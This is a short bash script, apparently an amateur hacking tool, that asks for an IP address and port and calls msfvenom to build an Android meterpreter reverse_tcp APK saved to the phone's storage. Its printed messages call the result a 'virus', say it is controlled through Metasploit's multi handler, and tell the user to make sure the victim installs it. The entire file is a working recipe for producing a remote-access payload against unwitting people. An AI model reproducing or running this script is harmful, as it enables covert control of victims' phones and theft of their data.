#!/bin/bash

clear
python banner.py
echo -e '\e[0;31m[\e[0;32m*\e[31m]\e[0;37mWellcom to payload this program for create payload'
echo -e '\e[0;31m[\e[0;32m*\e[31m]\e[0;37mDo you want start'
read -p '[Y/N]' yesorno
if [ $yesorno = 'Y' ]
then
    clear
    figlet creating...
    echo -p '\e[0;31m[\e[0;32m*\e[31m]\e[0;37mStarting...'
    sleep 5
    read -p 'IP-ADDRESS :' ip
    read -p 'Port       :' port
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R -o /sdcard/payload.apk
    echo -e '\e[0;31m[\e[0;32m*\e[31m]\e[0;37mSUCESSFULL!! Your payload.apk in your phone strorge'
    echo -e '\e[0;31m[\e[0;32m*\e[31m]\e[0;37mYou can controle virus with metasploit multi handler'
    echo -e '\e[0;31m[\e[0;32m*\e[31m]\e[0;37mMake sure victim install apk'
    echo ':)bye bye'
    echo 'thanks for ussing'
elif [ $yesorno = 'N' ]
then
    echo -e '\e[0;31m[\e[0;32m*\e[31m]\e[0;37mCancell:('
else
    echo 'chose [Y/N] input wrong :('
fi
